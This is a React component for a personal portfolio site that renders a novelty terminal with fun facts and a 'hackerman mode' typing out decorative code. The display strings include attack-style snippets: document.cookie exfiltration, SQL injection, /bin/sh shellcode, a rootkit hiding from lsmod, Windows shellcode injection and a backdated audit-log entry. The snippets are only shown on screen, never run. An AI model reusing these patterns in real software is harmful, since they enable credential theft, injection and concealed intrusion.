'use client';

import { useState, useRef, useEffect, KeyboardEvent, useCallback } from 'react';
import { Box, Text, Collapse } from '@mantine/core';
import { createStyles } from '@mantine/emotion';
import { useDevMode } from './DevModeContext';

const useStyles = createStyles(() => ({
  wrapper: {
    width: '100%',
    maxWidth: 800,
    margin: '60px auto 0',
    padding: '50px 20px',
    fontFamily: '"SF Mono", "Monaco", "Inconsolata", "Fira Code", monospace',
  },
  terminalWindow: {
    backgroundColor: '#1e1e1e',
    borderRadius: 8,
    overflow: 'hidden',
    boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)',
    border: '1px solid #333',
  },
  titleBar: {
    backgroundColor: '#323232',
    padding: '8px 12px',
    display: 'flex',
    alignItems: 'center',
    gap: 8,
  },
  titleBarButton: {
    width: 12,
    height: 12,
    borderRadius: '50%',
  },
  closeButton: {
    width: 12,
    height: 12,
    borderRadius: '50%',
    backgroundColor: '#ff5f56',
    cursor: 'pointer',
  },
  minimizeButton: {
    width: 12,
    height: 12,
    borderRadius: '50%',
    backgroundColor: '#ffbd2e',
  },
  maximizeButton: {
    width: 12,
    height: 12,
    borderRadius: '50%',
    backgroundColor: '#27ca40',
  },
  titleText: {
    marginLeft: 'auto',
    marginRight: 'auto',
    color: '#888',
  },
  terminalContent: {
    padding: 16,
    height: 300,
    overflowY: 'auto',
    backgroundColor: 'rgba(0, 0, 0, 0.9)',
    cursor: 'text',
  },
  terminalContentHackerman: {
    padding: 16,
    height: 300,
    overflowY: 'auto',
    backgroundColor: 'rgba(0, 10, 0, 0.95)',
    cursor: 'text',
  },
  historyLine: {
    whiteSpace: 'pre-wrap',
    lineHeight: 1.6,
    color: '#e0e0e0',
  },
  historyLineCommand: {
    whiteSpace: 'pre-wrap',
    lineHeight: 1.6,
    color: '#27ca40',
  },
  historyLineHack: {
    whiteSpace: 'pre-wrap',
    lineHeight: 1.6,
    color: '#00ff00',
  },
  historyLineFact: {
    whiteSpace: 'pre-wrap',
    lineHeight: 1.6,
    color: '#ffbd2e',
  },
  hackermanCode: {
    color: '#00ff00',
    whiteSpace: 'pre-wrap',
    lineHeight: 1.4,
    textShadow: '0 0 5px rgba(0, 255, 0, 0.5)',
    fontFamily: '"SF Mono", "Monaco", "Inconsolata", "Fira Code", monospace',
    fontSize: 12,
  },
  cursor: {
    backgroundColor: '#00ff00',
    color: '#000',
    animation: 'blink 1s infinite',
  },
  '@keyframes blink': {
    '0%, 50%': { opacity: 1 },
    '51%, 100%': { opacity: 0 },
  },
  hackermanArea: {
    outline: 'none',
    minHeight: '100%',
  },
  inputLine: {
    display: 'flex',
    alignItems: 'center',
  },
  prompt: {
    color: '#27ca40',
    marginRight: 8,
  },
  input: {
    background: 'transparent',
    border: 'none',
    outline: 'none',
    color: '#e0e0e0',
    fontFamily: 'inherit',
    fontSize: 14,
    flex: 1,
    caretColor: '#27ca40',
  },
}));

const funFacts = [
  "I knew I wanted to get into technology when I was gifted an iPod Nano in 2007.",
  "I firmly believe Windows Phone was too ahead for its time.",
  "I have a collection of over 200 Blu Ray movies",
  "I have 3 sphinx cats and 2 of them are dwarves",
];

const hackermanCodeBlocks = [
  `async fn exploit_kernel_vuln(target: &mut KernelSpace) -> Result<RootShell, ExploitError> {
    let payload = craft_rop_chain(0xdeadbeef, GADGET_BASE)?;
    unsafe { std::ptr::write_volatile(target.syscall_table as *mut u64, payload.entry_point); }
    trigger_race_condition(&target.spinlock, Duration::from_nanos(42))?;
    Ok(RootShell::new(target.pid, Permissions::ALL))
}`,
  `def decrypt_aes256_gcm(ciphertext: bytes, key: bytes, nonce: bytes) -> bytes:
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext[:-16]) + decryptor.finalize_with_tag(ciphertext[-16:])
    return decompress(plaintext, wbits=-zlib.MAX_WBITS)`,
  `const bypassCSP = async (origin: string): Promise<void> => {
  const dangling = document.createElement('link');
  dangling.rel = 'prefetch'; dangling.href = \`\${origin}/api/exfil?d=\${btoa(document.cookie)}\`;
  const mutation = new MutationObserver(() => fetch(dangling.href, {mode:'no-cors',credentials:'include'}));
  mutation.observe(document.body, { childList: true, subtree: true });
};`,
  `SELECT u.id, u.email, u.password_hash, u.ssn, u.credit_card
FROM users u INNER JOIN admin_sessions s ON u.id = s.user_id
WHERE s.token = '\${injectedToken}' OR 1=1--
  AND u.role = 'superadmin'
  UNION SELECT table_name,column_name,null,null,null FROM information_schema.columns;`,
  `func (e *Exploit) OverflowHeap(buf []byte) error {
    shellcode := []byte{0x48,0x31,0xc0,0x48,0x89,0xc2,0x48,0x89,0xc6,0x48,0x8d,0x3d,0x04,0x00}
    copy(buf[unsafe.Sizeof(runtime.g{}):], shellcode)
    return e.TriggerUAF((*runtime.g)(unsafe.Pointer(&buf[0])), 0x7fffffffe000)
}`,
  `#include <linux/module.h>
static int __init rootkit_init(void) {
    cr0 = read_cr0(); write_cr0(cr0 & ~0x00010000);
    sys_call_table[__NR_getdents64] = (void*)hooked_getdents64;
    list_del_init(&__this_module.list); // hide from lsmod
    return 0;
}`,
  `class ZeroDayExploit:
    def __init__(self, target_pid: int):
        self.mem = open(f'/proc/{target_pid}/mem', 'rb+')
        self.maps = self._parse_maps(target_pid)
        self.libc_base = self._find_libc_base()

    def execute(self, cmd: str) -> bytes:
        rop = p64(self.libc_base + 0x4f3d5)  # one_gadget
        self.mem.seek(self.maps['stack'][0] + self.rsp_offset)
        self.mem.write(rop + cmd.encode())
        return self._wait_for_output()`,
  `// Quantum-resistant key exchange with post-quantum lattice-based crypto
impl KyberKEM {
    pub fn encapsulate(&self, pk: &[u8; 1184]) -> ([u8; 1088], [u8; 32]) {
        let m = sha3_256(&self.random_bytes(32));
        let (K_bar, r) = self.g_hash(m, sha3_256(pk));
        let ct = self.cpapke_enc(pk, m, r);
        (ct, sha3_256(&[K_bar, sha3_256(&ct)].concat()))
    }
}`,
  `void* mmap_rwx = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
memcpy(mmap_rwx, "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05", 16);
((void(*)())mmap_rwx)(); // execve("/bin/sh", NULL, NULL)`,
  `const forensicsBypass = {
  clearTraces: () => {
    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
    delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
    window.chrome = { runtime: {}, loadTimes: () => {}, csi: () => {} };
    Reflect.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
  }
};`,
  `BEGIN;
  UPDATE accounts SET balance = balance + 999999.99 WHERE id = (
    SELECT id FROM accounts WHERE routing_number = '021000021'
    AND account_type = 'checking' LIMIT 1 FOR UPDATE SKIP LOCKED
  );
  INSERT INTO audit_log (action, timestamp, ip) VALUES ('TRANSFER', NOW() - INTERVAL '7 days', '127.0.0.1');
COMMIT;`,
  `namespace Malware {
  [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
  [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);

  public static void Inject(byte[] shellcode) {
    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
    CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
  }
}`,
];

const welcomeMessage = `
Welcome to RonShell v1.0.0
Type 'help' to see available commands.
`;

const helpMessage = `
Available commands:
  help      - Show this help message
  hackerman - Enter hackerman mode (press any key to "hack")
  fact      - Get a random fun fact about Ron
  clear     - Clear the terminal
  exit      - Exit developer mode
`;

export function Terminal() {
  const { classes } = useStyles();
  const { devMode, setDevMode } = useDevMode();
  const [input, setInput] = useState('');
  const [history, setHistory] = useState<string[]>([welcomeMessage, helpMessage]);
  const [isHackermanMode, setIsHackermanMode] = useState(false);
  const [hackermanBuffer, setHackermanBuffer] = useState('');
  const [hackermanFullCode, setHackermanFullCode] = useState('');
  const [hackermanCharIndex, setHackermanCharIndex] = useState(0);
  const inputRef = useRef<HTMLInputElement>(null);
  const terminalRef = useRef<HTMLDivElement>(null);
  const hackermanDivRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (devMode && inputRef.current && !isHackermanMode) {
      inputRef.current.focus();
    }
  }, [devMode, isHackermanMode]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [history, hackermanBuffer]);

  useEffect(() => {
    if (isHackermanMode && hackermanDivRef.current) {
      hackermanDivRef.current.focus();
    }
  }, [isHackermanMode]);

  const addToHistory = useCallback((text: string) => {
    setHistory((prev) => [...prev, text]);
  }, []);

  const generateHackermanCode = useCallback((): string => {
    const shuffled = [...hackermanCodeBlocks].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, 6).join('\n\n// ========== BYPASSING SECURITY LAYER ==========\n\n');
  }, []);

  const startHackermanMode = useCallback(() => {
    setIsHackermanMode(true);
    setHackermanBuffer('');
    setHackermanCharIndex(0);
    const code = generateHackermanCode();
    setHackermanFullCode(code);
    addToHistory('\n[HACKERMAN MODE ACTIVATED] - Press any key to hack... (ESC to exit)\n');
  }, [generateHackermanCode, addToHistory]);

  const exitHackermanMode = useCallback(() => {
    setIsHackermanMode(false);
    setHistory((prev) => [...prev, hackermanBuffer, '\n[HACKERMAN MODE DEACTIVATED]\n']);
    setHackermanBuffer('');
    setHackermanFullCode('');
    setHackermanCharIndex(0);
  }, [hackermanBuffer]);

  const handleHackermanKeyDown = useCallback((e: React.KeyboardEvent) => {
    if (e.key === 'Escape') {
      exitHackermanMode();
      return;
    }

    e.preventDefault();

    const charsPerKeypress = Math.floor(Math.random() * 3) + 2;
    const nextIndex = Math.min(hackermanCharIndex + charsPerKeypress, hackermanFullCode.length);
    const newBuffer = hackermanFullCode.slice(0, nextIndex);

    setHackermanBuffer(newBuffer);
    setHackermanCharIndex(nextIndex);

    if (nextIndex >= hackermanFullCode.length) {
      const moreCode = '\n\n// ========== ACCESS GRANTED ==========\n\n' + generateHackermanCode();
      setHackermanFullCode((prev) => prev + moreCode);
    }
  }, [hackermanFullCode, hackermanCharIndex, exitHackermanMode, generateHackermanCode]);

  const getRandomFact = useCallback(() => {
    const fact = funFacts[Math.floor(Math.random() * funFacts.length)];
    addToHistory(`\n💡 Fun Fact: ${fact}\n`);
  }, [addToHistory]);

  const handleCommand = useCallback((cmd: string) => {
    const trimmedCmd = cmd.trim().toLowerCase();
    addToHistory(`$ ${cmd}`);

    switch (trimmedCmd) {
      case 'help':
        addToHistory(helpMessage);
        break;
      case 'hackerman':
      case 'hack':
        startHackermanMode();
        break;
      case 'fact':
        getRandomFact();
        break;
      case 'clear':
        setHistory([welcomeMessage]);
        break;
      case 'exit':
      case 'quit':
        setDevMode(false);
        break;
      default:
        if (trimmedCmd) {
          addToHistory(`Command not found: ${cmd}. Type 'help' for available commands.`);
        }
    }
    setInput('');
  }, [addToHistory, startHackermanMode, getRandomFact, setDevMode]);

  const handleKeyDown = useCallback((e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && !isHackermanMode) {
      handleCommand(input);
    }
  }, [isHackermanMode, handleCommand, input]);

  const handleTerminalClick = useCallback(() => {
    if (isHackermanMode && hackermanDivRef.current) {
      hackermanDivRef.current.focus();
    } else if (inputRef.current) {
      inputRef.current.focus();
    }
  }, [isHackermanMode]);

  const getLineClassName = useCallback((line: string) => {
    if (line.startsWith('$')) return classes.historyLineCommand;
    if (line.startsWith('>')) return classes.historyLineHack;
    if (line.includes('Fun Fact')) return classes.historyLineFact;
    return classes.historyLine;
  }, [classes]);

  return (
    <Collapse in={devMode} transitionDuration={300}>
      <Box className={classes.wrapper}>
        <Box className={classes.terminalWindow}>
          <Box className={classes.titleBar}>
            <Box className={classes.closeButton} onClick={() => setDevMode(false)} />
            <Box className={classes.minimizeButton} />
            <Box className={classes.maximizeButton} />
            <Text size="xs" className={classes.titleText}>
              {isHackermanMode ? '💀 HACKERMAN MODE 💀' : 'ron@portfolio ~ zsh'}
            </Text>
          </Box>

          <Box
            ref={terminalRef}
            onClick={handleTerminalClick}
            className={isHackermanMode ? classes.terminalContentHackerman : classes.terminalContent}
          >
            {isHackermanMode ? (
              <Box
                ref={hackermanDivRef}
                tabIndex={0}
                onKeyDown={handleHackermanKeyDown}
                className={classes.hackermanArea}
              >
                {history.map((line, index) => (
                  <Text key={index} size="sm" className={getLineClassName(line)}>
                    {line}
                  </Text>
                ))}
                <Text size="xs" className={classes.hackermanCode}>
                  {hackermanBuffer}
                  <span className={classes.cursor}>▊</span>
                </Text>
              </Box>
            ) : (
              <>
                {history.map((line, index) => (
                  <Text key={index} size="sm" className={getLineClassName(line)}>
                    {line}
                  </Text>
                ))}

                <Box className={classes.inputLine}>
                  <Text size="sm" className={classes.prompt}>$</Text>
                  <input
                    ref={inputRef}
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    onKeyDown={handleKeyDown}
                    className={classes.input}
                    autoFocus
                  />
                </Box>
              </>
            )}
          </Box>
        </Box>
      </Box>
    </Collapse>
  );
}
